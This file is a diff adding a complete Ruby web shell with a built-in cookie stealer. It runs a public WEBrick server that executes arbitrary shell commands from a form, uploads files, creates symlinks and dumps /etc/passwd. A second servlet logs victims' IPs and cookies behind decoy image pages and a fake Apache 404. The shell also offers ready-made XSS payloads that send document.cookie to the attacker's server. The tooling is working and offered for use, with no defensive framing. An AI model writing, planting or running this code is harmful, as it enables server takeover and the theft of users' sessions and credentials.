@@ -1,0 +1,258 @@
+#!/usr/bin/env ruby
+#
+# Ruby Web Shell
+# By: Hood3dRob1n
+#
+
+# Where are we?
+HOME = File.expand_path(File.dirname(__FILE__)) << '/'
+
+PORT = 31337   ##### Port to Run Ruby Web Server on
+DOCROOT = HOME ##### DocumentRoot for Web Server to use
+
+########## EDIT IMAGES & PATHS - FOR LOGGER KIT ###########
+DAGIF = "images/cookie_monster-wall2wall.gif"      #
+DAJPG = "images/cookie_monster-owningNewbs.jpeg"   #
+DAPNG = "images/cookie_monster-FuckModeration.png" #
+###########################################################
+
+require 'webrick'
+include WEBrick
+
+# Execute system commands
+# Result output returned as an array
+def commandz(foo)
+  bar = IO.popen("#{foo}")
+  foobar = bar.readlines
+  return foobar
+end
+
+# Basic WEBrick Server Config & Start
+def start_webrick(config = {})
+  config.update(:BindAddress => "0.0.0.0")     
+  server = HTTPServer.new(config)
+  yield server if block_given?
+  ['INT', 'TERM'].each do |signal| 
+    trap(signal) { server.shutdown }
+  end
+  server.start
+end
+
+# Now we build our servlets to perform magic tricks...
+class FooServlet < HTTPServlet::AbstractServlet
+  # Placeholder for later stuff to come...
+end
+
+# Cookie Stealer and/or Simple Logger
+class CookieMonsterServlet < HTTPServlet::AbstractServlet
+  # Handle Incoming GET Requests
+  def do_GET(request, response)
+    @logv=[]
+    @foolog=[]
+    @current=[]
+    @logv=[]
+
+    # Parameters We want to log stuff for
+    if request.query['cookie'] or request.query['image']
+      if not request.peeraddr.empty?
+        @current << "<b>Remote IP: </b>#{request.peeraddr[3]}:#{request.peeraddr[1]}<br><b>Remote Hostname: </b>#{request.peeraddr[2]}"
+        @logv << "Remote IP: #{request.peeraddr[3]}:#{request.peeraddr[1]}\nRemote Hostname: #{request.peeraddr[2]}\n"
+      end
+      if not request.header['HTTP_X_FORWARDED_FOR'].empty?
+        @current << "<b>HTTP_X_FORWARDED_FOR: </b>#{request.header['HTTP_X_FORWARDED_FOR']}"
+        @logv << "HTTP_X_FORWARDED_FOR: #{request.header['HTTP_X_FORWARDED_FOR']}\n"
+      end
+      if not request.request_uri.nil?
+        @current << "<b>Request URI: </b>#{request.request_uri}"
+        @logv << "Request URI: #{request.request_uri}\n"
+      end
+      if not request.query_string.empty?
+        @current << "<b>Request Received: </b>#{request.query_string}"
+        @logv << "Request Received: #{request.query_string}\n"
+      end
+      if not request.header['user-agent'].empty?
+        @current << "<b>User-Agent: </b>#{request.header['user-agent'][0]}"
+        @logv << "User-Agent: #{request.header['user-agent'][0]}\n"
+      end
+      if not request.cookies.empty?
+        @current << "<b>Cookies: </b>#{request.cookies}"
+        @logv << "Cookies: #{request.cookies}\n"
+      end
+
+      @current << "<b>Time Stamp: </b>#{request.request_time}"
+      @logv << "Time Stamp: #{request.request_time}"
+
+      # Option to referesh page view to see current logs
+      @refresh = "<br><input type='button' value='Refresh Logs' onClick='document.location.reload(true)'><br>"
+
+      # Join everything we added so far and put new lines between each for clean formatting on output....
+      @cookieMonster = "#{@current.join("<br>")}" #Print this to see current request values instead of logs
+
+      # Log Results to File.....
+      cookiez = File.open("cookieMonster.txt", 'a+')
+      cookiez.puts "\nImages or Cookie Hit:\n#{@logv.join}\n"
+      cookiez.close
+    end
+
+    if request.query['image']
+      option = request.query['image']
+      if option.to_i == 3
+        @outputz = "<html><head><body style=\"background-color:#9B111E;\"><title>Cookie Monster Fan Club Image Gallery</title><body><div style='position:absolute;z-index:0;left:0;top:0;width:100%;height:100%'><img src='#{DAPNG}' style='width:100%;height:100%' alt='[]' /></div></body></html>"
+      elsif option.to_i == 2
+        @outputz = "<html><head><body style=\"background-color:#9B111E;\"><title>Cookie Monster Fan Club Image Gallery</title><body><div style='position:absolute;z-index:0;left:0;top:0;width:100%;height:100%'><img src='#{DAGIF}' style='width:100%;height:100%' alt='[]' /></div></body></html>"
+      else
+        @outputz = "<html><head><body style=\"background-color:#9B111E;\"><title>Cookie Monster Fan Club Image Gallery</title><body><div style='position:absolute;z-index:0;left:0;top:0;width:100%;height:100%'><img src='#{DAJPG}' style='width:100%;height:100%' alt='[]' /></div></body></html>"
+      end
+      response.body = "#{@outputz}"
+    elsif request.query['cookie']
+      @outputz = "<body style=\"background-color:#9B111E;\"><title>Under Construction</title><H1>Site is under maintenance</H1><br>Please check back again soon......<br>"
+      response.body = "#{@outputz}"
+    else
+      @outputz = "<body style=\"background-color:#9B111E;\"><title>404 File Not Found</title><H1>Not Found</H1><br>The requested URL #{request.request_uri} was not found on this server<br><hr>Apache/2.2.4 Server at #{request.host} on Port #{request.port}"
+      response.status = 404
+      response.body = "#{@outputz}"
+    end
+  end
+end
+
+# Our Main Web Shell
+class WebShellServlet < HTTPServlet::AbstractServlet
+  res = commandz('whoami')
+  if res.nil?
+    id='N/A'
+  else
+    id = res[0].chomp
+  end
+  platform = RUBY_PLATFORM
+  if RUBY_PLATFORM =~ /Windows|Win32|Win64|\.NET/i
+    build='N/A'
+  else
+    res = commandz('uname -a')
+    if res.nil?
+      build='N/A'
+    else
+      build=res[0].chomp
+    end
+  end
+  @@basic_info = { 'ID' => id, 'PLATFORM' => platform, 'BUILD' => build, 'PWD' => DOCROOT }
+  @@count=0
+  @@cookieLink=0
+  @@html = "<body style=\"background-color:#9B111E;\"><title>Ruby Rox</title><H1>HR's Ruby Web Shell</H1><b>ID: </b>#{@@basic_info['ID']}<br><b>Platform: </b>#{@@basic_info['PLATFORM']}<br><b>DocRoot: </b>#{@@basic_info['PWD']}<br><b>Build: </b>#{@@basic_info['BUILD']}<br><br>"
+
+  @@os = "
+    <b>OS Commands: </b>
+    <form action='/ruby' method='POST'>
+    <b>CMD:</b><input type='text' name='cmd'><br/>
+    <input type='submit' value='Run Command'>
+    </form><br>"
+
+  @@up = "
+    <b>File Uploader: </b>
+    <form action='/ruby' method='POST' enctype='multipart/form-data'>
+    File Name After Upload: <input type='text' name='newname'><br/>
+    File: <input type='file' name='filename'><br/>
+    <input type='submit' value='Upload'>
+    </form><br>"
+
+  @@sym = "
+    <b>Symlinker: </b>
+    <form action='/ruby' method='POST'>
+    Target File/Dir to Symlink: <input type='text' name='target'><br/>
+    New Symlink Name: <input type='text' name='symlink'><br/>
+    <input type='submit' value='Run Symlink'>
+    </form><br>"
+
+  @@userenum = "
+    <b>User Enumeration: </b>
+    <form action='/ruby' method='POST'>
+    Enumerate System Users:<input type='submit' value='Enum Users' name='userenum'>
+    </form><br>"
+
+  @@clearlogz = "
+    <form action='/ruby' method='POST'>
+    <input type='submit' value='Clear Logs' name='wipe'><input type='button' value='Refresh Logs' onClick='document.location.reload(true)'>
+    </form><br>"
+
+  # Handle Incoming GET Requests
+  def do_GET(request, response)
+    @foolog=[]
+    if request.query['action']
+      # Do something?
+    else
+      if File.exists?('cookieMonster.txt')
+        foolog = File.open("cookieMonster.txt").readlines
+        foolog.each do |line|
+          @foolog << line.gsub!(/(<[^>]*>)|\n|\t/s) {"\n"}
+        end
+        @@view = "<b>IP Logger Links:</b><br><b>GIF:</b>      http://#{request.host}:#{request.port}/yummy?image=1 <br><b>PNG:</b>     http://#{request.host}:#{request.port}/yummy?image=2 <br><b>JPEG:</b> http://#{request.host}:#{request.port}/yummy?image=3 <br><br><b>Cookie Monster Logger Link: </b>http://#{request.host}:#{request.port}/yummy?cookie= <br><br><b>Possible Injections:</b><br><textarea style='width: 1177px; height: 116px;'><script src=\"http://#{request.host}:#{request.port}/yummy?cookie=\"+ document.cookie></script>\n\n<script>document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\" + document.cookie</script>\n\n<script>document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\" + document.cookie;document.location=\"http://www.whateversite-2-redirect-back-to.com\"</script>\n\n<iframe frameborder=0 width=0 height=0 src=jvoid(document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\"+document.cookie)></iframe></textarea><br><br><b>Cookie Monster Logs Viewer: </b><br><textarea style='width: 1182px; height: 145px;'>#{@foolog.join}</textarea>#{@@clearlogz}"
+      else
+        @@view = "<b>IP Logger Links:</b><br><b>GIF:</b>      http://#{request.host}:#{request.port}/yummy?image=1<br><b>PNG:</b>      http://#{request.host}:#{request.port}/yummy?image=2 <br><b>JPEG:</b> http://#{request.host}:#{request.port}/yummy?image=3 <br><br><b>Cookie Monster Logger Link: </b>http://#{request.host}:#{request.port}/yummy?cookie= <br><br><b>Possible Injections:</b><br><textarea style='width: 1177px; height: 116px;'><script src=\"http://#{request.host}:#{request.port}/yummy?cookie=\"+ document.cookie></script>\n\n<script>document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\" + document.cookie</script>\n\n<script>document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\" + document.cookie;document.location=\"http://www.whateversite-2-redirect-back-to.com\"</script>\n\n<iframe frameborder=0 width=0 height=0 src=jvoid(document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\"+document.cookie)></iframe></textarea><br><br><b>Cookie Monster Logs Viewer: </b><br><textarea style='width: 1182px; height: 145px;'>Nothing Logged Yet!</textarea>#{@@clearlogz}"
+      end
+      response.body = "#{@@html}#{@@os}#{@@up}#{@@sym}#{@@userenum}#{@@view}"
+    end
+  end
+
+  # Handle Incoming GET Requests
+  def do_POST(request, response)
+    if File.exists?('cookieMonster.txt')
+      @foolog = File.open("cookieMonster.txt").readlines
+      @@view = "<b>IP Logger Links:</b><br><b>GIF:</b>        http://#{request.host}:#{request.port}/yummy?image=1 <br><b>PNG:</b>     http://#{request.host}:#{request.port}/yummy?image=2 <br><b>JPEG:</b> http://#{request.host}:#{request.port}/yummy?image=3 <br><br><b>Cookie Monster Logger Link: </b>http://#{request.host}:#{request.port}/yummy?cookie= <br><br><b>Possible Injections:</b><br><textarea style='width: 1177px; height: 116px;'><script src=\"http://#{request.host}:#{request.port}/yummy?cookie=\"+ document.cookie></script>\n\n<script>document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\" + document.cookie</script>\n\n<script>document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\" + document.cookie;document.location=\"http://www.whateversite-2-redirect-back-to.com\"</script>\n\n<iframe frameborder=0 width=0 height=0 src=jvoid(document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\"+document.cookie)></iframe></textarea><br><br><b>Cookie Monster Logs Viewer: </b><br><textarea style='width: 1182px; height: 145px;'>#{@foolog.join}</textarea>#{@@clearlogz}"
+    else
+      @@view = "<b>IP Logger Links:</b><br><b>GIF:</b>        http://#{request.host}:#{request.port}/yummy?image=1 <br><b>PNG:</b>     http://#{request.host}:#{request.port}/yummy?image=2 <br><b>JPEG:</b> http://#{request.host}:#{request.port}/yummy?image=3 <br><br><b>Cookie Monster Logger Link: </b>http://#{request.host}:#{request.port}/yummy?cookie= <br><br><b>Possible Injections:</b><br><textarea style='width: 1177px; height: 116px;'><script src=\"http://#{request.host}:#{request.port}/yummy?cookie=\"+ document.cookie></script>\n\n<script>document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\" + document.cookie</script>\n\n<script>document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\" + document.cookie;document.location=\"http://www.whateversite-2-redirect-back-to.com\"</script>\n\n<iframe frameborder=0 width=0 height=0 src=jvoid(document.location=\"http://#{request.host}:#{request.port}/yummy?cookie=\"+document.cookie)></iframe></textarea><br><br><b>Cookie Monster Logs Viewer: </b><br><textarea style='width: 1182px; height: 145px;'>Nothing Logged Yet!</textarea>#{@@clearlogz}"
+    end
+    if request.query['cmd']
+      res = commandz(request.query['cmd'])
+      if res.nil?
+        results = 'No Results Returned!'
+      else
+        results = res.join().chomp
+      end
+      response.body = "#{@@html}#{@@os}<b>Results:</b><br><textarea style='width: 1182px; height: 145px;'>#{results}</textarea><br><br>#{@@up}#{@@sym}#{@@userenum}#{@@view}"
+    elsif request.query['newname']
+      filedata = request.query["filename"]
+      if request.query["newname"].nil?
+        new_name = newfile.file
+      else
+        new_name = request.query["newname"]
+      end
+      f = File.open(new_name, "wb")
+      f.syswrite filedata
+      f.close
+      response.body = "#{@@html}#{@@os}#{@@up}<br><br><b>File Uploaded Successfully!</b><br>#{@@sym}#{@@userenum}#{@@view}"
+    elsif request.query['symlink']
+      File.symlink(request.query['target'], request.query['symlink'])
+      results = commandz('ls -lua').join
+      response.body = "#{@@html}#{@@os}<textarea style='width: 1182px; height: 145px;'>#{results}</textarea><br>#{@@up}#{@@sym}#{@@userenum}#{@@view}"
+    elsif request.query['userenum']
+      epasswd=[]
+      users_with_shells=[]
+      foobar = File.open("/etc/passwd").readlines
+      foobar.each do |passline|
+        if passline =~ /\/bi\w\/ba\wh/ #change to not match nologin and sort for cpanels?
+          foo = passline.split(':')
+          users_with_shells << "#{foo.first}\n\tHome Path: #{foo[5]}\n\tShell: #{foo[6]}"
+        end
+        foo = passline.split(':')
+        epasswd << foo.first
+      end
+      funky = "USERS WITH SHELLS:\n#{users_with_shells.join("\n")}\nFULL USERS LIST:\n#{epasswd.join("\n")}\n\n/ETC/PASSWD:\n#{foobar.join}\n"
+      response.body = "#{@@html}#{@@os}#{@@up}#{@@sym}#{@@userenum}<b>User Enum Results: </b><br><textarea style='width: 1182px; height: 145px;'>#{funky}</textarea><br><br>#{@@view}"
+    elsif request.query['wipe']
+      if File.exists?('cookieMonster.txt')
+        File.delete "cookieMonster.txt"
+      end
+      response.body = "#{@@html}#{@@os}#{@@up}#{@@sym}#{@@userenum}#{@@view}"
+    else
+      response.body = "#{@@html}#{@@os}#{@@up}#{@@sym}#{@@userenum}#{@@view}"
+    end
+  end
+end
+
+# Main?
+# Start the magic show ;)
+start_webrick( :DocumentRoot => DOCROOT, :Port => PORT.to_i) do |server|
+  # Mount Servlets to Handle Requests and Perform Actions
+  server.mount('/ruby', WebShellServlet)        # Our Web Shell
+  server.mount('/yummy', CookieMonsterServlet)  # Simple Cookie Logger
+end
+# EOF
